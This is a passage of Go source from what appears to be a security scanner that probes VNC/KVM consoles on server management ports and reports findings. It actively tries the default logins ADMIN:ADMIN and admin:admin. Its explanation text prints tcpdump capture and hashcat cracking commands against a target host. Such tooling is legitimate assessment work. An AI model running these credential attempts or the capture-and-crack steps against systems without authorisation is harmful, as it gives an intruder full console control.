			base = append(base, "insydeSession", "none")
		} else {
			base = append(base, "insydeSession", "active",
				"insydeChallenge", fmt.Sprintf("%x", info.insydeChallenge))
		}
	}
	switch {
	case info.defaultUser != "":

		return engine.Finding{
			Check: "kvm.vnc.defaultCreds", Category: "creds", Risk: "critical",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append(base,
				"defaultUsername", info.defaultUser,
				"defaultPassword", info.defaultPass,
				"proof", proofKV(
					"tcpPort", strconv.Itoa(p),
					"rfbVersion", info.version,
					"rfbSecurityTypes", info.secTypes,
					"rfbAuth", info.auth,
					"acceptedUsername", info.defaultUser,
					"rfbSecurityResult", "0"),
			)...),
		}
	case info.auth == "none":

		return engine.Finding{
			Check: "kvm.vnc.unauth", Category: "exposure", Risk: "high",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append([]string{"proof", proofKV(
				"tcpPort", strconv.Itoa(p),
				"rfbVersion", info.version,
				"rfbSecurityTypes", info.secTypes,
				"commonName", info.cn)},
				base...)...),
		}
	case enc == "none" && info.auth == "vncauth":

		return engine.Finding{
			Check: "kvm.vnc.cleartextAuth", Category: "exposure", Risk: "low",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append([]string{"proof", proofKV(
				"tcpPort", strconv.Itoa(p),
				"rfbVersion", info.version,
				"rfbSecurityTypes", info.secTypes,
				"rfbAuth", info.auth)},
				base...)...),
		}
	default:

		return engine.Finding{
			Check: "kvm.vnc", Category: "exposure", Risk: "info",
			Port: p, Transport: "tcp", Protocol: "vnc",
			Fields: engine.F(append([]string{"proof", proofKV(
				"tcpPort", strconv.Itoa(p),
				"transport", enc,
				"rfbVersion", info.version,
				"rfbSecurityTypes", info.secTypes,
				"rfbAuth", info.auth,
				"commonName", info.cn,
				"certOrg", info.org,
			)}, base...)...),
		}
	}
}

type vncInfo struct {
	tls             bool
	version         string
	auth            string
	secTypes        string
	cn              string
	org             string
	defaultUser     string
	defaultPass     string
	insydeChallenge []byte
}

type vncConn struct {
	c  net.Conn
	to time.Duration
}

func (v *vncConn) read(n int) ([]byte, bool) {
	_ = v.c.SetReadDeadline(time.Now().Add(v.to))
	buf := make([]byte, n)
	got := 0
	for got < n {
		m, err := v.c.Read(buf[got:])
		got += m
		if err != nil {
			break
		}
	}
	if got == 0 {
		return nil, false
	}
	return buf[:got], true
}

func (v *vncConn) write(b []byte) bool {
	_ = v.c.SetWriteDeadline(time.Now().Add(v.to))
	_, err := v.c.Write(b)
	return err == nil
}

const vncTLSMinTimeout = 5 * time.Second

func dialVNCTLS(addr string, to time.Duration) (*tls.Conn, error) {
	var err error
	for attempt := range 2 {
		var tc *tls.Conn
		tc, err = tls.DialWithDialer(&net.Dialer{Timeout: to}, "tcp", addr,
			&tls.Config{InsecureSkipVerify: true})
		if err == nil {
			return tc, nil
		}

		if attempt == 0 && !vncTLSWorthRetry(err) {
			break
		}
	}
	return nil, err
}

func vncTLSWorthRetry(err error) bool {
	if err == nil {
		return false
	}
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return true
	}
	s := err.Error()
	return strings.Contains(s, "connection reset") || strings.Contains(s, "unexpected EOF") ||
		strings.Contains(s, "broken pipe") || strings.Contains(s, "handshake failure")
}

func probeVNC(host string, port int, to time.Duration, online bool, vendor string) *vncInfo {
	if to <= 0 {
		to = 3 * time.Second
	}
	addr := net.JoinHostPort(host, strconv.Itoa(port))

	if c, err := net.DialTimeout("tcp", addr, to); err == nil {
		vc := &vncConn{c: c, to: to}
		if b, ok := vc.read(12); ok && strings.HasPrefix(string(b), "RFB ") {
			info := &vncInfo{version: parseRFBVersion(b)}
			negotiateVNC(vc, info, online, vendor)
			c.Close()
			return info
		}
		c.Close()
	}

	tc, err := dialVNCTLS(addr, max(to, vncTLSMinTimeout))
	if err != nil {
		return nil
	}
	defer tc.Close()
	info := &vncInfo{tls: true}
	if cs := tc.ConnectionState(); len(cs.PeerCertificates) > 0 {
		cert := cs.PeerCertificates[0]
		info.cn = cert.Subject.CommonName

		if len(cert.Subject.Organization) > 0 {
			info.org = cert.Subject.Organization[0]
		}
	}
	vc := &vncConn{c: tc, to: min(to, time.Second)}
	if b, ok := vc.read(12); ok && strings.HasPrefix(string(b), "RFB ") {
		info.version = parseRFBVersion(b)
		negotiateVNC(vc, info, online, vendor)
	} else {

		info.auth = "session-gated"
	}
	return info
}

func negotiateVNC(vc *vncConn, info *vncInfo, online bool, vendor string) {
	if !vc.write([]byte("RFB " + info.version + "\n")) {
		info.auth = "unknown"
		return
	}
	types := readSecurityTypes(vc)
	info.auth = classifyVNCAuth(info.version, types)
	info.secTypes = renderSecTypes(types)

	switch info.auth {
	case "insyde":

		if len(types) > 0 && vc.write([]byte{0x10}) {
			if ch, ok := vc.read(24); ok {
				info.insydeChallenge = append([]byte(nil), ch...)
			}
		}
	case "aten":
		if online {
			if u, p, ok := vncTryDefault(vc, info.auth, types, vendor); ok {
				info.defaultUser, info.defaultPass = u, p
			}
		}
	}
}

func parseRFBVersion(banner []byte) string {
	s := strings.TrimSpace(string(banner))
	if !strings.HasPrefix(s, "RFB ") || len(s) < 11 {
		return ""
	}
	return s[4:11]
}

func readSecurityTypes(vc *vncConn) []byte {
	b, ok := vc.read(1)
	if !ok || len(b) == 0 || b[0] == 0 {
		return nil
	}
	n := int(b[0])
	types, ok := vc.read(n)
	if !ok {
		return nil
	}
	return types
}

func renderSecTypes(types []byte) string {
	if len(types) == 0 {
		return "none-listed"
	}
	names := map[byte]string{1: "None", 2: "VNC", 5: "RA2", 6: "RA2ne", 16: "Tight", 19: "VeNCrypt"}
	parts := make([]string, 0, len(types))
	for _, t := range types {
		if n, ok := names[t]; ok {
			parts = append(parts, n+"("+strconv.Itoa(int(t))+")")
		} else {
			parts = append(parts, strconv.Itoa(int(t)))
		}
	}
	return strings.Join(parts, ",")
}

func classifyVNCAuth(version string, types []byte) string {
	if version == "055.008" {
		return "insyde"
	}
	has := func(t byte) bool {
		return slices.Contains(types, t)
	}
	switch {
	case has(16):
		return "aten"
	case has(2):
		return "vncauth"
	case has(1):
		return "none"
	case len(types) == 0:
		return "unknown"
	default:
		return "type" + strconv.Itoa(int(types[0]))
	}
}

func vncTryDefault(vc *vncConn, scheme string, types []byte, vendor string) (string, string, bool) {

	if len(types) > 0 {
		sel := byte(16)
		if !containsByte(types, 16) {
			sel = types[0]
		}
		if !vc.write([]byte{sel}) {
			return "", "", false
		}
	}

	_, _ = vc.read(4)
	cand := vncDefaults(vendor)[0]
	u, p, _ := strings.Cut(cand, ":")
	if !vc.write(append(pad24(u), pad24(p)...)) {
		return "", "", false
	}
	res, ok := vc.read(4)
	if ok && len(res) == 4 && res[0] == 0 && res[1] == 0 && res[2] == 0 && res[3] == 0 {
		return u, p, true
	}
	return "", "", false
}

func vncDefaults(vendor string) []string {
	if vendor == "supermicro" {
		return []string{"ADMIN:ADMIN"}
	}
	return []string{"ADMIN:ADMIN", "admin:admin"}
}

func pad24(s string) []byte {
	b := make([]byte, 24)
	copy(b, s)
	return b
}

func containsByte(bs []byte, b byte) bool {
	return slices.Contains(bs, b)
}

func init() {
	for _, check := range []string{
		"kvm.avocent.aps", "kvm.ami.redirect", "kvm.ami.vmedia",
		"kvm.hpe.irc", "kvm.cisco.vkvm", "kvm.usbAnywhere",
	} {
		c := check
		RegisterExplain(c, func(host string, f engine.Finding) string {
			return explainKVMChannel(host, f)
		})
		_ = c
	}
	RegisterExplain("kvm.vnc", explainKVMVNC)
	RegisterExplain("kvm.vnc.unauth", explainKVMVNCUnauth)
	RegisterExplain("kvm.vnc.cleartextAuth", explainKVMVNCCleartext)
	RegisterExplain("kvm.vnc.defaultCreds", explainKVMVNCDefaultCreds)
}

var portServiceName = map[int]string{
	3900:  "Avocent APS KVM console",
	7578:  "AMI KVM redirection service",
	5120:  "AMI virtual-media daemon",
	5121:  "AMI virtual-media daemon",
	5122:  "AMI virtual-media daemon",
	5123:  "AMI virtual-media daemon",
	623:   "USBAnywhere / KVM-side redirection channel",
	17988: "HPE iLO Integrated Remote Console (IRC)",
	17990: "HPE iLO IRC (TLS)",
	2068:  "Cisco CIMC vKVM console",
}

func explainKVMChannel(host string, f engine.Finding) string {
	vendor := explainField(f, "vendor")
	enc := explainField(f, "encryption")
	port := explainPortOrDefault(f, f.Port)
	svc := portServiceName[port]
	if svc == "" {
		svc = "KVM redirection service"
	}
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString(fmt.Sprintf("\n**%s** (%s) reachable on TCP/%d", svc, vendor, port))
	if enc == "tcp" {
		b.WriteString(" -- **no TLS** (cleartext channel)")
	} else if enc == "tls" {
		b.WriteString(" over TLS")
	}
	b.WriteString(".\n")
	b.WriteString("\n**Confirm reachability:**\n")
	b.WriteString(explainSh(fmt.Sprintf("nc -zv %s %d", host, port)))
	if enc == "tcp" {
		b.WriteString("\n\n> KVM channel uses no TLS -- the desktop stream can be captured by a\n")
		b.WriteString("> network-adjacent attacker.\n")
	}
	return b.String()
}

func explainKVMVNC(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	ver := explainField(f, "version")
	enc := explainField(f, "encryption")
	auth := explainField(f, "auth")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nVNC/RFB console listener detected.\n")
	if ver != "" {
		b.WriteString(fmt.Sprintf("**Protocol version:** `%s`  **Encryption:** `%s`  **Auth:** `%s`\n", ver, enc, auth))
	}
	b.WriteString("\n**Connect:**\n")
	b.WriteString(explainSh(fmt.Sprintf("vncviewer %s:%d", host, port)))
	return b.String()
}

func explainKVMVNCUnauth(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	proof := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nVNC/RFB server advertises `SecurityType=None` -- no authentication required.\n")
	if proof != "" {
		b.WriteString(fmt.Sprintf("\n**Proof:** `%s`\n", proof))
	}
	b.WriteString("\n**Connect without credentials:**\n")
	b.WriteString(explainSh(fmt.Sprintf("vncviewer %s:%d", host, port)))
	b.WriteString("\n\n**Impact:** Full unauthenticated KVM access -- view and control the server console.\n")
	return b.String()
}

func explainKVMVNCCleartext(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	proof := explainField(f, "proof")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString("\nVNC/RFB server uses VNC auth over a cleartext TCP connection. The\n")
	b.WriteString("challenge-response can be captured from the network and cracked offline.\n")
	if proof != "" {
		b.WriteString(fmt.Sprintf("\n**Proof:** `%s`\n", proof))
	}
	b.WriteString("\n**Crack the VNC password (capture first with tcpdump):**\n")
	b.WriteString(explainSh(
		fmt.Sprintf("tcpdump -i any -w /tmp/vnc.pcap host %s and tcp port %d", host, port),
		"hashcat -m 11200 vnc.hash /usr/share/wordlists/rockyou.txt",
	))
	return b.String()
}

func explainKVMVNCDefaultCreds(host string, f engine.Finding) string {
	port := explainPortOrDefault(f, 5900)
	user := explainField(f, "defaultUsername")
	pass := explainField(f, "defaultPassword")
	var b strings.Builder
	b.WriteString(explainHeading(host, f))
	b.WriteString(fmt.Sprintf("\nVNC server accepted the default credential **%s / %s**.\n", user, pass))
	b.WriteString("\n**Connect:**\n")
	b.WriteString(explainSh(fmt.Sprintf("vncviewer %s:%d", host, port)))
	b.WriteString("\n\n**Impact:** Full KVM console access with a known default password.\n")
	return b.String()
}
